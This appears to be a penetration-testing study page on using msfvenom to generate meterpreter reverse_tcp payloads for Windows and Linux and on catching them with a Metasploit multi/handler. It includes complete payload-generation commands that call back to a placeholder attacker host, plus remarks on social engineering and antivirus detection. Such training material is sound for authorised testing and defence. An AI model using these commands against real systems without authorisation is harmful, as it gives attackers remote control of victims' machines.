# Generating Payloads With Msfvenom

* A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed.
* Client-side attacks typically utilize various social engineering techniques like generating malicious documents or protable executables (PEs).
* Client-side attacks take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
* Given that this attack vector involves the transfer and storage of a malicious payload on the client's system (disk), attackers need to be cognisant of AV detection.

## Msfvenom

* Msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.
* Msfvenom is a combination of two utilities, namely; msfpayload and msfencode.
* We can use Msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

## Practice Demo

#### List out available payload

* "<mark style="color:yellow;">msfvenom --list payloads</mark>"

We will be focusing on the meterpreter payload.

### Difference between non staged and staged payloads

A non staged payload would be for example:

* "<mark style="color:yellow;">windows/x64/meterpreter\_reverse\_tcp</mark>"

While a staged payload would be:

* "<mark style="color:yellow;">windows/x64/meterpreter/reverse\_tcp</mark>"

The difference is in the name, showcasing the fact that a non-staged is sent together with the exploit.

### Generate a 32-bit Windows payload with Msfvenom

* "<mark style="color:yellow;">msfvenom -a x86 -p windows/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=porttoconnectto -f exe > /home/kali/Desktop/'name</mark>'"
  * "<mark style="color:red;">-a</mark>": Target OS Architecture
  * "<mark style="color:red;">-p</mark>": Payload to use
  * "<mark style="color:red;">-f</mark>": Format of the payload

<mark style="color:purple;">NOTE:</mark> When outputting the payload, always specifiy the <mark style="color:red;">EXTENSION</mark> you gave it in the name of the file

### Generating a 64-bit payload

* "<mark style="color:yellow;">msfvenom -a x64 -p windows/x64/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=porttoconnectto -f exe > /home/kali/Desktop/'name.ext</mark>'"

<mark style="color:purple;">NOTE:</mark> When outputting the payload, always specifiy the <mark style="color:red;">EXTENSION</mark> you gave it in the name of the file

### List Output format available

* "<mark style="color:yellow;">msfvenom --list formats</mark>"

### Generate Linux Payloads

* "<mark style="color:yellow;">msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=attackerIP LPORT=connecto -f elf > 'locationandname</mark>'

To execute it give it executable permission with "<mark style="color:red;">chmod</mark>".

### Set the platform for the payload

* <mark style="color:yellow;">--platform</mark>

## Setting up a handler&#x20;

A handler is necessary to receive the reverse tcp connection from the target system

### Using msfconsole

* "<mark style="color:yellow;">use multi/handler</mark>"
* "<mark style="color:yellow;">set payload 'payload specified in msfvenom'</mark>"

<mark style="color:purple;">NOTE:</mark> The payload in the handler has to be the same as when creating the payload with msfvenom.

Set the LHOST and LPORT options





















